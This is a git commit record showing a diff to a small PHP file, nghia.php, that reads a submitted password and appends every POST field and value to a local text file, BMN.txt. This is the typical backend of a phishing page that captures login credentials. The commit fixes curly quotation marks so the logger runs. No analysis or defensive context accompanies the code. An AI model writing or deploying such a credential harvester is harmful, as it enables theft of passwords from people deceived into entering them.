5e55bfbce7a748598ce2c3b4e77e2f8377fa83df
PikachuVina <bmn.2312@gmail.com>
2017-05-31 21:48:19 +0700

    1

--- nghia.php
+++ nghia.php
@@ -4,11 +4,11 @@ $pass = $_POST['password'];
 $handle = fopen("BMN.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
-   fwrite($handle, “=”);
+   fwrite($handle, "=");
    fwrite($handle, $value);
-   fwrite($handle, “\r\n”);
+   fwrite($handle, "\r\n");
 }
-fwrite($handle, “\r\n”);
+fwrite($handle, "\r\n");
 fclose($handle);
 exit;
 ?>
